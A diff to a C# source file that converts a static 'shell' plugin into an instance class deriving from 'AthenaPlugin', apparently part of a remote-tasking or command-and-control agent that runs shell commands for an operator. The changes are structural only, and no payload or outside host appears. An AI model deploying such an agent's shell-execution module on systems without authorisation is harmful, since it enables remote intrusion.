@@ -5,12 +5,12 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Text;
 
-namespace Plugin
+namespace Plugins
 {
-    public static class shell
+    public class Plugin : AthenaPlugin
     {
-        static Dictionary<string, Process> runningProcs = new Dictionary<string, Process>();
-        public static void Execute(Dictionary<string, object> args)
+        Dictionary<string, Process> runningProcs = new Dictionary<string, Process>();
+        public override void Execute(Dictionary<string, object> args)
         {
             try
             {
@@ -22,8 +22,7 @@ namespace Plugin
                 PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
             }
         }
-
-        public static void Kill(Dictionary<string, object> args)
+        public void Kill(Dictionary<string, object> args)
         {
             try
             {
@@ -52,8 +51,7 @@ namespace Plugin
                 });
             }
         }
-
-        public static ResponseResult ShellExec(Dictionary<string, object> args)
+        public ResponseResult ShellExec(Dictionary<string, object> args)
         {
             string parameters = "";
             if (!String.IsNullOrEmpty((string)args["arguments"]))
@@ -116,6 +114,5 @@ namespace Plugin
                 };
             }
         }
-
     }
 }
